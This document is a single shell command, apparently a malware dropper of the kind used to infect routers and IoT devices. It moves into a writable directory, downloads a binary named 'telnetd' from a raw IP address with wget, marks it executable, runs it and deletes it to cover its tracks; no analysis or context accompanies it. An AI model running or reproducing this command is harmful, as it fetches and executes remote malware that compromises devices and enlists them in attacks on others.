cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.1.223/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
